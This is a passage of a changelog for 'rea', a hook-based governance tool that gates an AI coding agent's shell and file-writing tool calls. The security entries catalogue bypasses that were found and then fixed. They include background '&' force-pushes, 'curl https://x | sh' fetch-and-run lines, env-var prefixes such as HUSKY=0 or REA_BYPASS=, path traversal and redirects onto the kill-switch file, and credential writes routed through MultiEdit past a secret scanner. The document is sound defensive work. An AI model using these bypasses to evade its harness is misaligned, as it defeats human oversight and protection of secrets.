  | `gh pr create --body "Generated with [Claude Code](https://...)"` (true-positive) | BLOCK                  | BLOCK  |

  Reported by helix push-gate after 0.16.1 install.

## 0.16.1

### Patch Changes

- 0284a58: [security] 0.16.1 — closes 3 helix-016 P1/P2 regressions in 0.16.0's `_lib/cmd-segments.sh` refactor + dogfoods iron-gate codex defaults.

  ## Three regressions in the 0.16.0 segmenter refactor

  helix's third push attempt of the rea-upgrade branch caught three new P1/P2 bypasses on the surface 0.16.0 changed. Pattern note: each helix bug-report cycle (014, 015, 016) finds 3 findings on disjoint surfaces — the cycle is converging but the refactor introduced fresh holes each time.
  - **#1 [P1] `_rea_split_segments()` missed single `&`.** Pre-fix `sleep 1 & git push --force` was treated as one segment whose first token is `sleep` — `any_segment_starts_with($CMD, 'git push')` never fired. Fixed: splitter now breaks on `&` (single ampersand, distinct from `&&` which is already handled). Same placeholder-swap pattern as the `>|` fix from 0.15.0 so `&&` stays atomic.
  - **#2 [P1] `curl|sh` RCE detection silently dropped.** The 0.16.0 refactor moved the H12 check inside `any_segment_matches` — but the segmenter splits on `|` first, so `curl https://x | sh` decomposed into two segments and the regex (which requires both halves) never matched. `curl-pipe-shell` is a multi-segment property; restored to grep against the raw `$CMD`. Pipe-RCE is the only check in this hook with the multi-segment-correlation property — built as the documented exception, not a new general primitive.
  - **#3 [P2] `dependency-audit-gate.sh` env-var prefixes bypassed.** Pre-fix the prefix allow-list only permitted `sudo|exec|time`. `CI=1 pnpm add foo`, `NODE_ENV=development npm install bar`, `HUSKY=0 pnpm add baz`, `DEBUG=* npm install qux` all bypassed. Fixed: strip leading `KEY=VALUE` env-var assignments before command matching (POSIX shell semantics). Plus tightened token classification — a "package name" can no longer contain shell metacharacters like `=`, `>`, `<`, `&`, `|`, `;`, `$`, backtick, quotes (closes the sibling `2>&1`-as-package fragility).

  ## Iron-gate codex defaults dogfooded — `.rea/policy.yaml` pinned

  The user's exact question: "did you update YOUR OWN reviews for CODEX to use the top model?" — the answer was no, and that's why the firefight cycle kept producing fresh P1s each round.

  0.14.0 added `codex_model: gpt-5.4` + `codex_reasoning_effort: high` as iron-gate defaults for the **push-gate runtime** (`runCodexReview`). But the rea repo's OWN dogfood `.rea/policy.yaml` never declared them, and the codex-adversarial agent (used by interactive `/codex-review`) was a separate code path that never got the same model pin. So:
  - Helix's push-gate ran `codex exec review -c model="gpt-5.4" -c model_reasoning_effort="high"` (235s, ~50 events) — caught helix-014, 015, 016.
  - rea's own pre-publish review used codex CLI defaults (`codex-auto-review` at medium reasoning) — meaningfully WEAKER than helix's gate. The reasoning-effort gap is what let regressions slip into 0.15.0 / 0.16.0 only to be caught at consumer push time.

  Two fixes in this release:
  - **`.rea/policy.yaml`**: explicit `codex_model: gpt-5.4` + `codex_reasoning_effort: high` so when rea's own push-gate runs (when `codex_required: true`), it uses the same iron-gate model the consumers do.
  - **`agents/codex-adversarial.md`**: documents the model pinning contract so interactive `/codex-review` invocations also request `gpt-5.4` + `high` (or fall back to invoking `codex exec review --json --ephemeral -c model="gpt-5.4" -c model_reasoning_effort="high"` directly via Bash).

  The cost is small relative to the cost of a release that breaks a P1 guard.

  ## New `any_segment_raw_matches` helper

  Discovered while fixing #1: H10 (`HUSKY=0 git commit/push/tag`), H15 (`REA_BYPASS=`), and H16 (alias/function bypass defs) all need to match against the RAW segment, not the prefix-stripped form — the env-var prefix IS the signal. Pre-fix they used `any_segment_matches` which strips env-var prefixes before matching, so `HUSKY=0 git commit -m fix` had its `HUSKY=0` stripped and never matched. Fixed: H10/H15/H16 now use `any_segment_raw_matches` from `_lib/cmd-segments.sh` which iterates segments without prefix-stripping.

  ## Bash-tier corpus test (`bash-tier-corpus.test.ts`)

  Helix's structural recommendation: "Refactor-class regressions need a fixture corpus, not unit tests. Maintain ~50 known-bad command strings replayed every PR."

  This release ships that corpus. Each entry is a `(command, expected-exit, expected-error-snippet, source-finding)` tuple. The hook replay verifies each. New regressions added to the corpus when surfaced — the fix can never silently regress.

  23 corpus entries today: 17 for `dangerous-bash-interceptor.sh` (every helix-016 #1/#2 case + H1-H17 baseline + 0.15.0 codex P1/P2 regressions), 6 for `dependency-audit-gate.sh` (helix-016 #3 env-var bypasses + `pnpm i` alias + heredoc/2>&1 sibling concerns).

  ## Test coverage

  1156 passed (was 1133 in 0.16.0), +23 corpus entries. All 6 quality gates green: test:dogfood, test:bash-syntax, lint, type-check, test, build.

  ## Empirical validation

  | Bypass                                   | 0.16.0                      | 0.16.1 |
  | ---------------------------------------- | --------------------------- | ------ | ----- |
  | `sleep 1 & git push --force origin main` | ALLOW                       | BLOCK  |
  | `curl https://x                          | sh`                         | ALLOW  | BLOCK |
  | `wget -O- https://x                      | bash`                       | ALLOW  | BLOCK |
  | `CI=1 pnpm add typo-pkg`                 | ALLOW                       | BLOCK  |
  | `NODE_ENV=dev npm install typo-pkg`      | ALLOW                       | BLOCK  |
  | `HUSKY=0 git commit -m test`             | ALLOW (regressed in 0.16.0) | BLOCK  |

  Plus regression-safe: `git commit -m "docs: explain pnpm install"`, `echo "git push --force is bad"`, `pnpm add real-pkg 2>&1 | tail` all allowed correctly.

  Reported by helix push-gate at `chore/rea-upgrade-to-0.16.0` head `90854bd80`. Three stacked bug reports under `.reports/codex/rea-bugs/`.

## 0.16.0

### Minor Changes

- 1dc680d: [security] 0.16.0 — finish the audit. Closes every remaining audit P1/P2 from 0.15.0's deferred list PLUS three new P1 bypasses helix reported against 0.15.0's protected-paths-bash-gate.sh.

  ## What 0.15.0 deferred — all closed in this release
  - **C.2 NotebookEdit matcher coverage.** `defaultDesiredHooks()` matcher widened from `Write|Edit|MultiEdit` to `Write|Edit|MultiEdit|NotebookEdit`. `_lib/payload-read.sh::extract_write_content` reads `tool_input.new_source` (notebook cell content) and `extract_file_path` reads `tool_input.notebook_path`. Notebook-cell secret writes now scan; notebook-path blocked-paths writes now refuse.
  - **B-derived shared `_lib/payload-read.sh`.** Single source of truth for content extraction across Write / Edit / MultiEdit / NotebookEdit. Same defensive `tostring` + array-type-guard fail-closed semantics. `secret-scanner.sh` and `changeset-security-gate.sh` migrated; the next write-tier tool is a one-line edit here, not a sweep across N hooks.
  - **D.1 architecture-review-gate path normalization.** Now sources `_lib/path-normalize.sh::normalize_path`. Pre-fix, this hook only stripped $REA_ROOT prefix; Windows / Git Bash backslash paths and URL-encoded forms silently bypassed the architectural review.
  - **H.1 settings-protection.sh §6 intermediate-symlink resolution.** §6c added: when the parent directory of `$FILE_PATH` exists and resolves into a hard-protected directory (`.husky/`, `.rea/`, `.claude/`), refuse the write. Closes the symmetric concern Helix Finding 2 raised against §5b — same bypass shape, hard-protected list this time.
  - **H.2 blocked-paths-enforcer symlink resolution.** Same `cd -P && pwd -P` parent-resolve added. If a `pretty/ -> ../secrets/` symlink resolves into a `blocked_paths` policy entry, the write refuses.
  - **J.2 H17 inline YAML parser → `policy_list`.** dangerous-bash-interceptor.sh's 40-line inline YAML walker replaced with a one-line `policy_list "delegate_to_subagent"` call. All hooks now read policy through the same shared helper.
  - **J.3 Eight hooks reimplement HALT inline.** Migrated `architecture-review-gate.sh`, `attribution-advisory.sh`, `blocked-paths-enforcer.sh`, `dangerous-bash-interceptor.sh`, `dependency-audit-gate.sh`, `env-file-protection.sh`, `secret-scanner.sh`, `settings-protection.sh` to source `_lib/halt-check.sh::check_halt`. The kill-switch contract is no longer duplicated 8 times. (`_lib/halt-check.sh` and `_lib/policy-read.sh` had `set -euo pipefail` which propagated to callers and caused spurious exit-1s on benign non-zero greps; relaxed to `set -uo pipefail` since these are sourced libraries.)

  ## helix-015 — 3 P1 bypasses in 0.15.0's `protected-paths-bash-gate.sh` closed

  helix reported three exploitable bypasses against the new gate immediately after 0.15.0 shipped. All confirmed real on macOS:
  - **#1 `..` traversal not normalized.** `printf x > .claude/hooks/../settings.json` writes to `.claude/settings.json` but the gate compared the literal path string and didn't match the `.claude/settings.json` pattern. Fixed: `_normalize_target` now resolves `..` segments by walking the path before matching.
  - **#2 Case-sensitive matcher on case-insensitive macOS.** `printf x > .ClAuDe/settings.json` lands on the protected file (APFS is case-insensitive by default) but the matcher compared exact case. `settings-protection.sh` had a CI matcher since 0.10.x; the new `_lib/protected-paths.sh::rea_path_is_protected` was missing it. Both target and pattern now lowercased for comparison.
  - **#3 Redirect regex too narrow.** Pre-fix only matched `>`, `>>`, `2>`, `2>>`, `&>`. Missed `1>`, `1>>`, `>|` (noclobber-override), and any `[0-9]+>` / `[0-9]+>>` fd-prefixed forms. All of these write to the target. Widened: `(&>>|&>|[0-9]+>>|[0-9]+>\||[0-9]+>|>>|>\||>)`. Plus `_lib/cmd-segments.sh` segment splitter updated so `>|` doesn't get broken apart by the `|` separator.

  ## Empirical validation

  | Bypass case                                 | 0.15.0   | 0.16.0  |
  | ------------------------------------------- | -------- | ------- |
  | `printf x > .claude/hooks/../settings.json` | ALLOW ❌ | BLOCK ✓ |
  | `printf x > .ClAuDe/settings.json`          | ALLOW ❌ | BLOCK ✓ |
  | `printf x 1> .rea/HALT`                     | ALLOW ❌ | BLOCK ✓ |
  | `printf x >\| .rea/HALT`                    | ALLOW ❌ | BLOCK ✓ |
  | `printf x 9> .rea/HALT`                     | ALLOW ❌ | BLOCK ✓ |

  Plus regression-safe: `printf x > /tmp/log`, `tee /tmp/audit`, `echo done > .rea/audit/foo`, `git commit -m 'test'` all exit 0 (legitimate writes not over-blocked).

  ## API additions
  - `hooks/_lib/path-normalize.sh::normalize_path` — extracted from `settings-protection.sh` and `blocked-paths-enforcer.sh` inline implementations
  - `hooks/_lib/path-normalize.sh::resolve_parent_realpath` — extracted from `settings-protection.sh §5b`
  - `hooks/_lib/payload-read.sh::extract_write_content` — Write / Edit / MultiEdit / NotebookEdit content
  - `hooks/_lib/payload-read.sh::extract_file_path` — Write / Edit / MultiEdit / NotebookEdit path

  ## Test coverage

  1108 passed, all 6 quality gates green: `test:dogfood`, `test:bash-syntax`, `lint`, `type-check`, `test`, `build`.

  ## What's left for 0.17.0+

  The audit's last open items, all explicit-design rather than bug-fix:
  - Class G install-template integrity test (parses every `commands/*.md` and `agents/*.md` body for tool references and verifies they're declared in `allowed-tools`)
  - Hooks-as-Node-binary rewrite (long-term: every parser bug class in this audit is a bash idiosyncrasy)

  After 0.16.0 lands, every codex-flagged class from the original audit (A through O) is closed at every current instance. Future tool surfaces (the next NotebookEdit) require ONE helper update in `_lib/payload-read.sh` rather than N parallel hook patches. Class I drift, Class E parser bugs, and J.9 shell-redirect bypass are structurally extinct.

  Reported by BST, helixir, helix. Audit consolidated by codex (P0/P1 classification) + principal-engineer review (severity adjustment) + helix-015 follow-up.

## 0.15.0

### Minor Changes

- 24db4a7: [security] 0.15.0 — iron-gate-2: comprehensive hook-coverage audit + structural fixes that stop the firefight cycle.

  After five releases shipped today (0.13.1, 0.13.2, 0.13.3, 0.14.0, the
  workflow retry fix) each closing bugs that consumers reported AFTER
  publish, an explicit hold-the-release adversarial audit ran across the
  full install surface (`hooks/`, `.claude/hooks/`, `agents/`, `commands/`,
  `src/cli/install/settings-merge.ts`). Three external teams (BST,
  helixir, helix) had reported nine distinct bugs across those releases.
  The audit identified three structural gaps that explained the cycle:
  1. Codex review was diff-scoped — adjacent canonical files invisible
  2. No shared `_lib/` helpers — every hook reimplemented primitives
  3. No install-template integrity tests — frontmatter / dogfood drift
     unchecked

  This release closes the structural gaps and bundles the P0/P1 fixes
  the audit surfaced. After this lands, three bug families are
  **structurally extinct**: canonical/dogfood drift (Class I),
  full-command grep parser bugs (Class E), and shell-redirect bypass
  of protected paths (Class J.9).

  ## Structural fixes (prevent regression of entire bug families)

  **`tools/check-dogfood-drift.mjs`** + `pnpm test:dogfood` — runs
  `diff -rq` of three canonical/dogfood pairs (`hooks/`, `agents/`,
  `commands/`) and fails on any mismatch. Wired into `pnpm test`. The
  single highest-leverage change in this release. Closes Class I drift
  forever — `.claude/hooks/secret-scanner.sh` cannot be the pre-0.14.0
  version while `hooks/secret-scanner.sh` has the MultiEdit fix; the
  test fails CI on the first PR that lands such drift.

  **`pnpm test:bash-syntax`** — `bash -n` syntax check on every shell
  file under `hooks/` and `hooks/_lib/`. Cheap, covers the failure
  mode where a `_lib/` migration introduces a syntax error that drift-
  CI passes (because both copies are equally broken).

  **`hooks/_lib/cmd-segments.sh`** — shared shell-segment splitter
  exposing `for_each_segment` and `any_segment_starts_with` /
  `any_segment_matches` primitives. Replaces every hand-rolled
  full-command grep across the Bash-tier hooks. Future Bash-tier hooks
  source this rather than reimplementing the parser. Closes Class E
  parser bugs forever — no hook hand-rolls the parser anymore.

  **`hooks/_lib/protected-paths.sh`** — single source of truth for the
  hard-protected path list (`.rea/HALT`, `.rea/policy.yaml`,
  `.claude/settings.json`, `.claude/settings.local.json`, `.husky/`).
  Both `settings-protection.sh` (Write/Edit/MultiEdit tier) and the
  new `protected-paths-bash-gate.sh` (Bash tier) read this list, so
  adding a path requires a single edit and cannot drift.

  ## P0 — dogfood emergency closures
  - **I.1** `.claude/hooks/secret-scanner.sh` was the pre-0.14.0
    version. MultiEdit credential writes were unscanned in this very
    repo. Synced from canonical.
  - **I.2** `.claude/hooks/changeset-security-gate.sh` carried the
    BSD-grep `\1`-backref regex bug. Synced from canonical.
  - **I.3** `.claude/hooks/dependency-audit-gate.sh` did not recognize
    `pnpm i` shorthand. Synced.
  - **I.4** stale `.claude/hooks/push-review-gate-git.sh` (removed
    upstream in 0.11.0) was never deleted from dogfood. Removed.

  ## P1 — must-fix bugs
  - **E.1** `dangerous-bash-interceptor.sh` H1, H3-H17 each greped the
    full command, false-positive on heredoc bodies and commit messages
    containing trigger words. Migrated to `any_segment_starts_with`
    for command-anchored checks (`rm`, `git`, `kill`, etc.) and
    `any_segment_matches` for context patterns (`HUSKY=0`,
    `REA_BYPASS=`).
  - **E.2** `env-file-protection.sh` greped full command. Now per-
    segment via `any_segment_matches`. Commit messages mentioning
    `.env` or `cat` no longer false-block.
  - **E.3** `attribution-advisory.sh` greped full command. Now per-
    segment so commits whose body comments on AI attribution
    ("removed Co-Authored-By: noreply@ in 0.14") no longer trip the
    blocker.
  - **F.2** `commands/review.md` `allowed-tools` was missing `Agent`
    while Step 2 invokes the `code-reviewer` agent — same shape as
    Helix Finding 1 against codex-review.md, in a sibling command.
  - **F.1** `commands/codex-review.md` Step 3 was a hard verification
    gate that contradicted `codex-adversarial.md`'s 0.11.0+ "audit
    emission optional" contract (Helix Finding 3 only partially
    shipped — agent side fixed, command side still drift). Rewrote
    Step 3 to match.
  - **G.1** `commands/freeze.md` `allowed-tools` was missing `Read`
    while the Preflight reads `.rea/policy.yaml` and `.rea/HALT`.
  - **J.7** H11 `BROAD_TARGETS` regex matched a single literal `.` —
    `rm -rf .git/x` (legitimate `.git/`-tree cleanup) false-blocked.
    Anchored each token on whitespace-or-EOS.
  - **J.9** `.rea/HALT`, `.rea/policy.yaml`, `.claude/settings.json`,
    `.husky/*` were bypassable via Bash shell redirect (`> path`,
    `tee path`, `cp X path`, `mv X path`, `sed -i path`, `dd of=path`,
    `truncate path`). The kill-switch file was reachable via Bash even
    though Write/Edit/MultiEdit refused it. New
    `hooks/protected-paths-bash-gate.sh` hooks the `Bash` matcher
    AFTER `dangerous-bash-interceptor.sh` and refuses any redirect /
    write-utility whose target matches `_lib/protected-paths.sh`.

  ## P2 included (high-leverage)
  - **J.10** `git push origin +<branch>` (refspec `+` shorthand for
    force-push) was not caught by H1. Added detection alongside
    `--force` / `-f`.
  - **C (matcher coverage)** `Write|Edit|MultiEdit` matcher on
    `defaultDesiredHooks()` Group 2 + Group 3 (`MultiEdit` already
    added in 0.14.0; this release confirms the matcher is unchanged
    and `protected-paths-bash-gate.sh` is registered on the `Bash`
    matcher).

  ## Deferred to 0.16.0+
  - **C.2** NotebookEdit matcher coverage + content extraction —
    no current consumer reports notebooks; tracked.
  - **J.3** Eight hooks reimplement HALT detection inline. Migration
    to `_lib/halt-check.sh` is mechanical refactor, no consumer-
    facing bugfix; tracked.
  - **B-derived** Shared `_lib/payload-read.sh` for content
    extraction — secret-scanner and changeset-security-gate already
    carry working duplicates; consolidation tracked.
  - **D.1** `architecture-review-gate.sh` path normalization — uses
    `_lib/path-normalize.sh::normalize_path` once that helper lands
    in 0.16.0.
  - **H.1** `settings-protection.sh §6` intermediate-symlink
    resolution for the hard-protected list (Helix Finding 2 class)
    — tracked; 0.16.0.
  - **Class G template-integrity test** — automated check that every
    `commands/*.md` and `agents/*.md` body's tool references appear
    in its `allowed-tools` frontmatter. Tracked.
  - **Hooks-as-Node-binary rewrite** — every parser bug class in
    this audit (E, D, J.4, J.5) is a bash idiosyncrasy. Long-term
    the right move is rewriting hooks as a single typed Node binary
    with bash files as thin shims. 0.16+ tracking item.

  ## Note on the dogfooded `.claude/settings.json`

  `protected-paths-bash-gate.sh` is registered in `defaultDesiredHooks()`
  so consumers running `rea init` / `rea upgrade` from 0.15.0 get the
  new hook wired in. The rea repo's OWN `.claude/settings.json` is hard-
  protected (the very file this release helps protect) and must be
  hand-refreshed by a maintainer on 0.15.0 install. A future release
  will close this drift via a `Class M` settings.json schema /
  desired-hooks integrity test.

  ## Test coverage

  1108 passed (was 1078 in 0.14.0), all six quality gates green:
  `pnpm test:dogfood`, `pnpm test:bash-syntax`, `pnpm lint`,
  `pnpm type-check`, `pnpm test`, `pnpm build`.

  Empirical validation: false-positive cases that motivated the parser
  fixes (`git commit -m "...rm -rf node_modules..."` and
  `git commit -m "stop reading .env via cat"`) now exit 0 cleanly. The
  shell-redirect bypass case (`printf FROZEN > .rea/HALT`) now exits 2
  with a clear error pointing at `_lib/protected-paths.sh`.

  Reported by BST, helixir, helix — and the principal-engineer audit
  that consolidated their reports into Classes A-O.

## 0.14.0

### Minor Changes

- 75714f0: [security] 0.14.0 — iron-gate codex defaults + two protected-hook fixes.

  Three changes ship together because they share the same theme: rea
  should be a hard gate, not a leaky one.

  **Codex defaults (behavioral change).** The push-gate previously
  invoked `codex exec review` with no `-c model=…` override, so codex
  fell through to its built-in default — which today is the
  special-purpose `codex-auto-review` model at `medium` reasoning, NOT
  the flagship `gpt-5.4`. Lower-reasoning models contributed to the
  verdict-thrashing reported during the 2026-04-26 helixir migration
  session. 0.14.0 pins `gpt-5.4` + reasoning `high` as the new default,
  exposed via two new `policy.review` knobs:
  - `policy.review.codex_model: <name>` — defaults to `gpt-5.4`. Set to
    `codex-auto-review` (or `gpt-5.4-mini`, `gpt-5.3-codex`, …) for
    cost-bounded environments.
  - `policy.review.codex_reasoning_effort: low | medium | high` —
    defaults to `high`. Trades push-gate latency for verdict
    consistency.

  When set, the runner passes `-c model="<value>"` and
  `-c model_reasoning_effort="<value>"` to every `codex exec review`
  spawn. TOML-quoted with shell-safe escaping for `\` and `"`. `MIGRATING.md`
  gets a "codex model knobs" section.

  **Secret scanner now catches MultiEdit (P1 security fix).** Reported
  by an external team. Pre-0.14.0, `hooks/secret-scanner.sh` only
  inspected `tool_input.content` (Write) and `tool_input.new_string`
  (Edit). MultiEdit's payload is at `tool_input.edits[].new_string`
  (an array) and was never scanned, so any agent could route credential
  writes through MultiEdit to bypass the scanner entirely. The hook now
  extracts every `new_string` value from the edits array and runs them
  through the same pattern scan. Precedence preserves: Write content
  beats Edit `new_string` beats MultiEdit `edits[]`.

  **Blocked-paths-enforcer rejects path traversal (P2 security fix).**
  Reported by the same team. Pre-0.14.0, `normalize_path()` stripped
  the project-root prefix and URL-decoded a fixed set of escape
  sequences but did NOT reject `..` segments. So
  `foo/../CODEOWNERS` would compare against the literal `CODEOWNERS`
  blocked-paths entry, fail to match, and the hook would exit 0 — the
  downstream Write tool would then resolve the traversal and write
  `CODEOWNERS` anyway. Mirrors the §5a path-traversal-reject pattern
  that `settings-protection.sh` has had since 0.10.x. Both pre- and
  post-decode forms are checked, plus URL-encoded traversal
  (`%2E%2E/`, `%2e%2e/`, `.%2E`).

  **Test coverage.** 1073 tests, +36 new across:
  - `__tests__/hooks/secret-scanner.test.ts` (new file, 11 tests
    covering Write/Edit/MultiEdit positive + negative + precedence)
  - `__tests__/hooks/blocked-paths-enforcer.test.ts` (new file, 13
    tests covering literal match, traversal-reject, agent-writable
    allowlist, defense-in-depth on traversal-vs-allowlist)
  - `src/hooks/push-gate/policy.test.ts` (7 new — codex_model + codex_reasoning_effort
    defaults, overrides, schema rejection of bad inputs)
  - `src/hooks/push-gate/codex-runner.test.ts` (6 new — spawn-args
    capture verifying `-c model="…"` and `-c model_reasoning_effort="…"`
    precede `exec`, both-set / neither-set / TOML-injection-escape /
    argument-order)

  **API additions.** `policy.review.codex_model: string`,
  `policy.review.codex_reasoning_effort: 'low' | 'medium' | 'high'`,
  `PUSH_GATE_DEFAULT_CODEX_MODEL`, `PUSH_GATE_DEFAULT_CODEX_REASONING_EFFORT`,
  `runCodexReview` options gain `model` + `reasoningEffort` fields. No
  breaking changes — all existing callers continue to work; defaults
  shift behavior toward stronger review.

  **Operator guidance.** Cost-bounded environments should pin a weaker
  model in `.rea/policy.yaml`:

  ```yaml
  review:
    codex_model: codex-auto-review
    codex_reasoning_effort: medium
  ```

  Default is the strongest available for adversarial review.

## 0.13.3

### Patch Changes

- 41fc904: Ship `MIGRATING.md` in the npm tarball.

  The 0.13.2 release added `MIGRATING.md` at the repo root and `rea
doctor`'s foreign-hook fail message references it ("See `MIGRATING.md`
  for a worked example"). The doc was missing from `package.json#files`,
  so consumers running `npm i @bookedsolid/rea` got the doctor reference
  but no local copy of the file. They had to land on GitHub to read it.

  Adds `MIGRATING.md` to the `files` allowlist alongside `README.md`,
  `SECURITY.md`, and `THREAT_MODEL.md`. Now the migration guide ships
  with every install — `cat node_modules/@bookedsolid/rea/MIGRATING.md`
  works.

## 0.13.2

### Patch Changes

- 3064640: Fix the 0.13.0 extension-hook contract end-to-end + ship a migration guide.

  Two defects in 0.13.0/0.13.1 made `.husky/{commit-msg,pre-push}.d/` —
  advertised as the upgrade-safe extension surface — unusable in
  practice. Both are fixed in 0.13.2.

  **Issue 1 — `settings-protection.sh` blocked the documented extension
  surface.** The `.husky/` prefix in `PROTECTED_PATTERNS` was correct for
  the package-managed bodies (`pre-push`, `commit-msg`, `_/*`), but it
  also caught `.husky/pre-push.d/00-act-ci` and `.husky/commit-msg.d/*` —
  the very directories consumers were supposed to write fragments into.
  Agents under rea's governance got `SETTINGS PROTECTION: Modification
blocked` whenever they tried to lay down a fragment. Fixed via a §5b
  allow-list that runs after path-traversal rejection but before the
  prefix block. `.husky/{commit-msg,pre-push}.d/*` and nested files
  under those dirs are now writable; the package-managed bodies and
  husky 9 runtime stubs (`.husky/_/*`) remain protected. Near-miss
  prefixes (`.husky/pre-push.d.bak/`, `.husky/pre-push.dump`) still hit
  the prefix block — only the literal `.d/` segment opens the surface.

  **Issue 2 — `$@` mutation in the v4 pre-push body corrupted argv for
  fragments.** The dispatch did `set -- "${REA_ROOT}/node_modules/.bin/rea"
hook push-gate "$@"` followed by `"$@"` to invoke. Because `set --`
  mutates `$@` in place, by the time the fragment loop ran `"$frag"
"$@"` it was passing the rewritten rea-CLI argv (`<rea-bin> hook
push-gate <remote> <url>`) instead of git's original `<remote> <url>`.
  Branch-policy linters, lint-staged-on-push wrappers, and any fragment
  that reads `$1`/`$2` per the standard pre-push contract would
  mis-handle the push or fail outright. Fixed by wrapping the dispatch
  in a subshell `(...)` so the `set --` rewrite stays scoped to the
  subshell; the parent's `$@` retains git's argv. Captures rea's exit
  status via `$?` after the subshell exits.

  **Doctor migration helper.** `rea doctor` now scans foreign pre-push
  hook bodies for references to recognizable consumer tooling
  (`commitlint`, `lint-staged`, `gitleaks`, `act-CI`) and adds an
  explicit migration recommendation to the fail message — pointing at
  `.husky/pre-push.d/` and `MIGRATING.md`.

  **`MIGRATING.md`.** New repo-root guide naming each conflict pattern
  by name (commitlint, lint-staged, gitleaks, act-CI, branch-policy
  linter, pre-existing rea invocation, husky 9 layout) with the exact
  copy-paste migration command for each. The mismatch between rea's
  0.11.0 stateless thesis and consumers' real-world prior infrastructure
  was a documentation gap as much as a code gap.

  API additions: none. Behavioral changes:
  - `settings-protection.sh` no longer blocks `.husky/{commit-msg,pre-push}.d/*`
  - `BODY_TEMPLATE` in `src/cli/install/pre-push.ts` runs rea inside a
    subshell; fragments now see git's original argv
  - `rea doctor`'s foreign-hook fail message includes a migration hint
    when prior tools are detected

  Reported by BST during the 0.13.0 → main upgrade
  (`booked-solid-tech/.scratch/rea-013-pre-push-issues.md`).

## 0.13.1

### Patch Changes

- 6741716: Fix `rea doctor` false-positive on husky 9 layouts.

  When `core.hooksPath=.husky/_` (husky 9's default), git fires the
  auto-generated stub at `.husky/_/<hookname>`, which sources `.husky/_/h`
  and exec's the canonical `.husky/<hookname>`. The doctor probe was
  classifying the stub directly — finding no rea marker and no
  `rea hook push-gate` reference in the stub — and reporting governance
  as inactive even though the hook git actually invokes carried the
  governance body.

  `classifyExistingHook` now detects the husky 9 stub shape (`. "${0%/*}/h"`
  or `. "$(dirname -- "$0")/h"` as the only non-comment line) and follows
  one level of indirection to the parent `.husky/<hookname>`, returning
  the parent's classification. Stub-of-stub recursion is capped at one
  hop. Non-stub paths take the existing classifier path unchanged — no
  behavior change for vanilla git or `core.hooksPath=.husky` layouts.

  Functional impact for consumers: cosmetic only. The push-gate already
  ran correctly through the husky 9 indirection — only `rea doctor` was
  misreporting.

  New exports: `isHusky9Stub`, `resolveHusky9StubTarget`. Existing
  `classifyExistingHook` signature gains an optional
  `{ followHusky9Stub?: boolean }` argument with default `true`.

  Reported by HELiXiR during the rea 0.13.0 evaluation.

## 0.13.0

### Minor Changes

- ab6cc84: 0.13.0 — extension-hook chaining + push-gate auto-narrow

  Two fixes addressing recommendations #1 and #3 from the REA v0.11.0 helixir-
  migration bug report. Both are workflow-unblocking — the gate stops fighting
  operators on long-running branches, and consumers can layer their own per-
  commit / per-push checks without forking the rea hook bodies.

  **H. Extension-hook chaining via `.husky/{commit-msg,pre-push}.d/*`.**
  Drop executable scripts into either directory and rea will run them after
  its own governance work, in lexical order, with the same positional args.
  Useful for layering commitlint, conventional-commits linters, branch-policy
  checks, or any other per-commit / per-push work without losing rea
  coverage.
  - Sourced AFTER rea's body — HALT, attribution blocking, and Codex review
    run first; fragments only fire when rea succeeds. A non-zero exit from
    rea short-circuits before any fragment runs.
  - Lexical order — `10-foo` runs before `20-bar`. Standard convention is to
    prefix with a two-digit ordering number.
  - Executable bit gates execution — non-executable files are silently
    skipped (`rea doctor` warns on this case so operators don't lose a hook
    to a missing `chmod +x`).
  - Non-zero exit fails the hook — the next fragment does not run, the
    push / commit is blocked. Matches husky's normal hook chaining
    semantics.
  - Missing directory is a no-op — backward compatible with consumers who
    never opt into fragments.

  Marker bumps for the husky pre-push and fallback hooks: `v3 -> v4`.
  Pre-0.13 commit-msg hooks shipped without a marker line; the new install
  adds `# rea:commit-msg v1` on line 2 and the upgrade path recognizes the
  unmarked-but-rea-shaped legacy body. `rea upgrade` recognizes v3 markers
  as legacy and refreshes 0.12.x installs in place; v2 + v1 legacy
  detection still applies for consumers stepping multiple versions at once.
  `rea doctor` adds an `extension hook fragments` info-level probe that
  lists every fragment it sees and warns on non-executable files.

  **J. Auto-narrow on large divergence.**
  When the resolved diff base is more than `policy.review.auto_narrow_threshold`
  commits behind HEAD AND the base was resolved from the active refspec's
  `remoteSha` (i.e. the previously-pushed tip of THIS branch — commits already
  Codex-reviewed in a prior push) AND no explicit narrowing was set, the gate
  scopes the review down to the last 10 commits and emits a stderr warning
  explaining the auto-narrow plus how to override. Default threshold is 30;
  explicit `0` disables auto-narrow entirely.

  Suppression rules — any of these prevents auto-narrow from firing:
  - `--last-n-commits N` flag (operator picked an exact window)
  - `--base <ref>` flag (operator picked an exact base)
  - `policy.review.last_n_commits` set (persistent narrow window)
  - Base was resolved via upstream / origin-head / origin-main ladder
    (initial push, no upstream, fallback to trunk)

  The last suppression rule is a hard safety constraint: auto-narrow MUST
  NOT fire on initial pushes. Earlier commits on the branch may never have
  been Codex-reviewed; skipping past them on an `origin/main`-shaped base
  would silently bypass the advertised pre-push review for a
  hook/policy/security change made early in the branch (codex-review
  0.13.0 [P1]).

  The probe runs `git rev-list --count base..HEAD` after base resolution; on a
  null result (range unresolvable) auto-narrow does not fire — better to
  review more than to trip a half-baked auto-narrow on a degenerate ref.
  Every reviewed audit event includes `auto_narrowed: true|undefined` +
  `original_commit_count: <N>|undefined` so operators can grep their audit
  log for narrowed reviews.

  Background: long-running branches with many commits since the last push
  routinely produced non-deterministic Codex verdicts and 30-minute timeouts
  — the "thrashing" pattern from the helixir-migration session. The 0.12.0
  `last_n_commits` knob fixed it for operators who knew to set it; J makes
  the protective default automatic for follow-up pushes without compromising
  first-push coverage.

  No schema breaking changes. No public-API breaking changes. Existing
  0.12.x installs upgrade cleanly via `rea upgrade` (which refreshes the
  husky/fallback hook bodies via the v3-legacy marker path).

## 0.12.0

### Minor Changes

- aff3fe7: 0.12.0 — helixir migration unblocker

  Five fixes addressing pain points surfaced during the helixir team's
  migration session 2026-04-26 (43 push attempts, ultimately uninstalled).

  A. **Fix `exec $REA_BIN` word-splitting in pre-push BODY_TEMPLATE.** The
  0.11.x stub relied on unquoted shell variable expansion to expand the
  multi-token rea-CLI invocation forms (`node /path/to/cli.js`,
  `npx --no-install @bookedsolid/rea`). When the repo path contained
  whitespace (`/Users/jane/My Projects/repo`), the unquoted `$REA_BIN`
  underwent word-splitting and the `exec` argv was wrong, producing
  "command not found" or running the wrong path entirely. The body now
  uses positional-args dispatch via `case`-arm `set --` and a final
  `exec "$@"`, preserving spaces verbatim. Marker bumps `v2 -> v3` for
  both the fallback and husky hooks; `rea upgrade` recognizes v2 markers
